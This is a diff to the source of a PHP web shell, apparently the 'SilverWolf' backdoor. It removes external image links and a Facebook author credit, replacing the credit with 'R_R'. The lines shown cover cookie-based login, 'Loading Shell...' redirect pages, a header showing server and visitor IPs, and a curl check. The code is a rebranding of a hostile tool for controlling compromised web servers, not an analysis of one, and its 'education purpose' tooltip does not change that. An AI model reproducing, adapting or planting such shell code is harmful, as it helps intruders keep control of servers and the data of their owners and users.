@@ -60,7 +60,7 @@ if($admin['check']) {
             doSmt($password);
 			p('<meta http-equiv="refresh" content="2;URL='.$self.'">');
 			p('<body bgcolor=black>
-<BR><BR><div align=center><font color=yellow face=tahoma size=2>Loading Shell...<BR><img src=https://silverwolf-share-tools.googlecode.com/svn/loading.jpg></div>');
+<BR><BR><div align=center><font color=yellow face=tahoma size=2>Loading Shell...<BR></div>');
 			exit;
 		}
 
@@ -73,7 +73,7 @@ if($admin['check']) {
     {
         scookie($admin['cookiename'], $admin['pass']);
         p('<meta http-equiv="refresh" content="2;URL='.$self.'">');
-        p('<body bgcolor=black><BR><BR><div align=center><font color=yellow face=tahoma size=2>Loading Shell...<BR><img src=https://silverwolf-share-tools.googlecode.com/svn/loading.jpg></div>');
+        p('<body bgcolor=black><BR><BR><div align=center><font color=yellow face=tahoma size=2>Loading Shell...<BR></div>');
         exit;
     }
 	if ($_COOKIE[$admin['cookiename']]) {
@@ -223,13 +223,13 @@ function goaction(act){
 }
 </script>
 </head>
-<body onLoad="init()" style="margin:0;table-layout:fixed; word-break:break-all" bgcolor=black background=https://silverwolf-share-tools.googlecode.com/svn/th_matrix.gif>
+<body onLoad="init()" style="margin:0;table-layout:fixed; word-break:break-all" bgcolor=black>
 <div border="0" style="position:fixed; width: 100%; height: 25px; z-index: 1; top: 300px; left: 0;" id="loading" align="center" valign="center">
 				<table border="1" width="110px" cellspacing="0" cellpadding="0" style="border-collapse: collapse" bordercolor="#003300">
 					<tr>
 						<td align="center" valign=center>
 				 <div border="1" style="background-color: #0E0E0E; filter: alpha(opacity=70); opacity: .7; width: 110px; height: 25px; z-index: 1; border-collapse: collapse;" bordercolor="#006600"  align="center">
-				   Loading<img src="https://silverwolf-share-tools.googlecode.com/svn/loading.gif">
+				   Loading
 				  </div>
 				</td>
 					</tr>
@@ -255,12 +255,12 @@ function goaction(act){
 <table width="100%" border="0" cellpadding="0" cellspacing="0">
 	<tr class="head_small">
 		<td  width=100%>
-		<table width=100%><tr class="head_small"><td  width=86px><p><a title=" .:: Warning ! This shell is used for education purpose ::. " href="<?php $self;?>"><img src=https://silverwolf-share-tools.googlecode.com/svn/jr.jpg height=86 border=0></a></p>
+		<table width=100%><tr class="head_small"><td  width=86px><p><a title=" .:: Warning ! This shell is used for education purpose ::. " href="<?php $self;?>"></a></p>
 	        </td>
 		<td>
             
 		<span style="float:left;"> <?php echo "Host: ".$_SERVER['HTTP_HOST']."";?> | Server IP: <?php echo "<font color=yellow>".gethostbyname($_SERVER['SERVER_NAME'])."</font>";?> | Your IP: <?php echo "<font color=yellow>".$_SERVER['REMOTE_ADDR']."</font>";?>
-	  | <a href="https://www.facebook.com/hoi.hacker.vn" target="_blank"><?php echo str_replace('.','','SilverWolf');?> </a> | <a href="javascript:goaction('logout');"><font color=red> Logout</font></a></span> <br />
+	  | <?php echo str_replace('.','','R_R');?> </a> | <a href="javascript:goaction('logout');"><font color=red> Logout</font></a></span> <br />
 
 		<?php
 		$curl_on = @function_exists('curl_version');
